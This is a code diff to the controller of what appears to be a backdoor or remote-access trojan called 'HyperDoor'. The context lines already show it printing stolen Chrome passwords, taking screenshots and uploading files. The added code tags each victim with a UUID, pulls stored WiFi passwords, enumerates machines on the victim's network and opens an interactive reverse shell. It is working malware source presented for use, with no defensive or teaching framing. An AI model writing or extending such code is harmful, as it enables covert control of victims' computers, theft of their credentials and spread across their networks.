@@ -5,6 +5,7 @@ import json
 from tabnanny import verbose
 import threading
 from datetime import datetime
+import uuid
 
 # Modules in subdirectories
 import util.help as help
@@ -13,6 +14,8 @@ import util.util as util
 from vidstream import StreamingServer
 import termcolor
 from pick import pick
+
+available_options = ['y', 'Y', 'n', 'N']
 
 # Server endpoint data
 server_endpoint = {
@@ -88,6 +91,12 @@ def screenshotRecv(target, ip):
       target.settimeout(None)
       f.close()
 
+
+#Prints a single profile on Windows
+def print_windows_profile(profile):
+    print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")
+
+
 # HELPER FUNCTIONS END
 
 class Server:
@@ -101,6 +110,8 @@ class Server:
             self.backlog = backlog
             self.targets = []
             self.ips = []
+            self.uuids = {}
+            self.targets_ip = {}
             self.verbose = True # Indicates if server events should be logged or not
 
       # Accept incoming connections and store them in the targets list
@@ -113,8 +124,12 @@ class Server:
 
                         if self.verbose: print(termcolor.colored(f"\n[+] {str(ip)} joined the network!", 'green'))
 
+                        # Create a new UUID for the target
+                        self.uuids[target] = str(uuid.uuid4()) # {socketfd:uuid}
+                        self.targets_ip[ip] = target # {ip(tuple):socketfd}
+
                   except Exception as e:
-                        pass
+                        print(e)
 
       # Initiates the streaming server on a separate thread
       def stream_server_start(self):
@@ -140,10 +155,28 @@ class Server:
                         print(e)
                         continue
 
+
+      def reverse_shell(self, target):
+            while True:
+                  cwd = recv(target)
+                  cmd = input(f'{cwd}$ ')
+                  send(target, cmd)
+
+                  try:
+                        if cmd == 'exit':
+                              break
+                        
+                        out = recv(target)
+                        print(out)
+                              
+                  except KeyboardInterrupt:
+                        print(termcolor.colored('[!] Keyboard interrupt', 'yellow'))            
+      
+
       # Server-Backdoor interface
       def target_coms(self, target, ip):
             while True:
-                  command = input(f'[+] session/{ip[0]}:{ip[0]}/HyperDoor$ ')
+                  command = input(f'[+] {self.uuids[target]}/{ip[0]}:{ip[1]}/HyperDoor$ ')
                   send(target, command) # Send command to target
 
                   if command == 'exit':
@@ -152,11 +185,13 @@ class Server:
                   if command == 'detatch':
                         self.targets.remove(target)
                         self.ips.remove(ip)
+                        self.uuids.pop(target)
+                        self.targets_ip.pop(ip)
                         if self.verbose: print(termcolor.colored(f"[!] {ip[0]}:{ip[1]} left the network!", 'yellow'))
                         break
 
                   elif command == 'clear':
-                        util.clearTerminal()
+                        util.clearTerminal()    
 
                   # Upload a file to the target's file system
                   elif command.startswith('upload'):
@@ -194,6 +229,17 @@ class Server:
                         print("[+] Chrome stored passwords:")
                         print(termcolor.colored(password_data, 'green'))
 
+                  elif command == 'wifi-passwords':
+                        profiles = recv(target)
+
+                        if len(profiles) > 0:
+                              print("[+] WiFi stored passwords:")
+                              for profile in profiles:
+                                    print_windows_profile(profile)
+
+                        else:
+                              print("[!] No WiFi stored passwords found")
+
                   elif command == 'system-info':
                         system_info = recv(target)
                         print(termcolor.colored(system_info, 'green'))
@@ -204,11 +250,35 @@ class Server:
 
                   elif command == 'help':
                         print(help.HELP_TARGET_COMS)
+                  
+                  elif command == 'connected-machines':
+                        show_names_flag = ''
+                        
+                        while show_names_flag not in available_options:
+                              show_names_flag = input("[+] Do you wish to attempt to fetch the hostnames of every machine? (not recommended for large networks) (y/n): ")
+                        
+                        # Inform the backdoor
+                        if show_names_flag.lower() == 'y':
+                              send(target, 'true')
+                        else:
+                              send(target, 'false')
+
+                        print(termcolor.colored('[!] This might take a bit... please be patient! (CTR+C to stop)', 'yellow'))
+
+                        try:
+                              # Receive the list of connected machines
+                              connected_machines = recv(target)
+                              print(termcolor.colored(connected_machines, 'green'))
+                        
+                        except KeyboardInterrupt:
+                              print(termcolor.colored('[!] Stopped fetching connected machines', 'yellow'))
+                              continue
+
+                  elif command == 'reverse-shell':
+                        self.reverse_shell(target)
 
                   else:
-                        # Reverse shell
-                        out = recv(target)
-                        print(out)
+                        print(termcolor.colored(f"[!] Unknown command: {command}", 'red'))
 
       # Execute a command on the server
       def shell(self):
@@ -217,14 +287,15 @@ class Server:
 
                   # Show all the targets connected to the server
                   if command == 'list-targets':
-                        counter = 0
                         if len(self.ips) == 0:
                               print(termcolor.colored("[!] No targets connected", "yellow"))
                         else:
+                              print(termcolor.colored(f"[+] {len(self.ips)} targets connected:", "green"))
+                              count = 0
                               for ip in self.ips:
-                                    print(f'Session [{counter}] | {str(ip)}')
-                                    counter += 1
-                  
+                                    print(termcolor.colored(f'  -> [{count}] | [{self.uuids[self.targets_ip[ip]]}] | {str(ip)}', 'green'))
+                                    count += 1
+
                   # Clear the screen
                   elif command == 'clear':
                         util.clearTerminal()
@@ -242,7 +313,7 @@ class Server:
                               #print(termcolor.colored(f'[-] No such session id ({str(num)})', 'yellow'))
 
                   # Show a menu that helps picking a target/backdoor session
-                  elif command == 'session-pick':
+                  elif command == 'session-pick' or command == 'pick':
                         options = self.ips
                         options.append("Quit")
 
